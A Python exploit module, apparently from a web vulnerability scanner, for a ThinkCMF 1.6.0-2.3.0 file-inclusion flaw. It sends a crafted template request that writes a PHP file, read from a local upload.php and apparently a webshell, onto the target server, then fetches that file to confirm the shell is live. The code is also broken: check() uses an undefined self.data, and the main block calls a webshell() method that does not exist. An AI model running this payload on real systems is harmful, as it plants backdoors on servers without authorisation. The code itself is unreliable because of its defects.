#!/usr/bin/env python3

import json
from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, get_useragent

class Thinkcmf_File_Include_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Thinkcmf File Include',
            'description': 'Thinkcmf File Include Vulnerability, ThinkCMF 1.6.0-2.3.0',
            'date': '2019-10-22',
            'exptype': 'check',
            'type': 'File Include Vulnerability'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url

        self.osname = 'Unknown'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent()
        }

        with open('app/static/upload.php', 'r', encoding = 'utf-8') as reader:
            php_data = reader.read()
        self.php_payload = '''/index.php?a=fetch&templateFile=public/inde&prefix=%27%27&content=<php>file_put_contents('{shellname}.php','{shellcontent}')</php>'''.format(shellname = self.capta, shellcontent = urlencode(php_data, encode_type = 'total'))

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            upload_req = await request.get(self.url + self.php_payload, headers = self.headers)
            response_str = json.dumps(upload_req.headers.__dict__['_store'])
            if upload_req.status == 200 and 'PHP' in response_str:
                shell_url = self.url + '/%s.php' %(self.data)
                check_req = await request.get(shell_url, headers = self.headers)
                if check_req.status == 200:
                    return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    ThinkCMF_File_Include = Thinkcmf_File_Include_BaseVerify('http://127.0.0.1')
    print(ThinkCMF_File_Include.webshell('test'))